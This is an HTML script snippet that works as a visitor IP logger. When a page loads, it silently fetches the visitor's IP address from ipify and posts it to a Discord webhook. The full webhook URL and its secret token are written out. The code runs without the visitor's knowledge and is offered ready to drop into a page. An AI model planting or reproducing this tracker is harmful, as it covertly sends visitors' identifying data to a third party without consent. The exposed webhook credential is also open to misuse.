      <script>
    window.onload = function() {
      // Get the visitor's IP address
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          const userIp = data.ip;

          // Discord webhook URL
          const webhookUrl = "https://discord.com/api/webhooks/1073270836968042546/dVAxy8_49eprY_BKlNk1A30XPctMQAGjrocYHA05kpX7SJUnx_QDhlwaiMa0CL0IX25G";

          // Payload that will be sent to the webhook
          const payload = {
            content: `Visitor's IP address: ${userIp}`
          };

          // Send the payload to the webhook
          fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          })
            .then(response => console.log("Payload sent successfully."))
            .catch(error => console.error("Error sending payload: ", error));
        });
    };
  </script>
